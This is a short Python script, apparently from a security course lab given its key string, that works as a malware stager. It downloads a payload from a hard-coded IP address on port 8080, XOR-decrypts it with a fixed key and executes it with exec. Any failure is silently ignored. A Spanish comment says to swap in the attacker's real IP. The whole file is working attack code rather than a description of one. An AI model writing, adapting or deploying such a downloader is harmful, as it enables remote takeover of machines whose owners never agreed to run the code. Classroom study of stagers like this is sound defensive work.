import urllib.request
import sys

_H = "195.0.1.5"   # Cambiar por la IP real del atacante
_P = 8080
_K = b"SecurityUTalca2026"


def _x(d, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))


def main():
    try:
        data = urllib.request.urlopen(f"http://{_H}:{_P}/payload", timeout=10).read()
        exec(compile(_x(data, _K).decode(), "<m>", "exec"), {"__name__": "__main__"})
    except Exception:
        pass


if __name__ == "__main__":
    main()
